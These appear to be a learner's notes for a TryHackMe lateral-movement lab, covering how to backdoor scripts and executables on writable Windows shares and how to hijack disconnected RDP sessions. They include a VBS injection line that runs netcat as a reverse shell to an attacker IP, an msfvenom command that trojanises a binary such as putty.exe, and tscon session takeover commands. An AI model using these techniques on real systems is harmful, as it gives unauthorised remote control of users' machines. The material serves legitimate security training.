# Abusing user behaviour

## Writable Shares

* Discover a globally writable share
* Discovers credentials that allow access to a writable share

As the share is enumerated, there are scripts or executable files on the server that may be run by several users. 
When a user runs the executable:

* A copy of the script/executable is made to a temporary directory on the user's computer
* The executable is run on the user's computer – not the server hosting the share

This increases the attack surface for anyone with access to the share and executable files.

### Backdooring .vbs Scripts

If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following 
code in the shared script:

    CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\FILE-SERVER-IP\share_name\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <IP address attack machine> 80", 0, True

If a user runs this from the file share, the script will:

* Copy nc64.exe from the file server to the user's temporary directory
* Give a reverse shell by executing nc64.exe and connecting to the attacker's IP address on a specified port.

### Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, it can be downloaded from the share and be injected with a 
backdoor (msfvenom makes it easy):

* Copy the binary from the file share to the attack machine
* Use it as a template to create an imposter
* Place the imposter on the file share
* Start a listener and wait for it

Create a malicious binary (noticeable by AV by the way):

    msfvenom -a x64 --platform windows -x /tmp/filename.exe -k -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=80 -b '\x00' -f exe -o filename.exe

## RDP Session hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, the 
session will remain open on the server indefinitely. With SYSTEM privileges on Windows Server 2016 and earlier, you 
can take over any existing RDP session without requiring a password. On Windows Server 2019 and newer, the attacker 
must know the password used to create the RDP session.

Logged in as the `Administrator` and running a shell as `NT AUTHORITY\SYSTEM`:

    C:\> query user
     USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
    >administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
     luke                                    3  Disc            .  4/6/2022 6:51 AM

For a RDP session that was not cleanly logged off and is suspended, attach it to the existing session, for example:

    tscon 3 /dest:rdp-tcp#6

## Flag

* Get a new set of credentials from http://distributor.za.tryhackme.com/creds_t2.
* Connect to THMJMP2 via RDP
* hijack `t1_toby.beck`'s RDP session on THMJMP2 to get your flag. Hijack a session marked as disconnected (Disc.) 
to avoid interfering with other users.

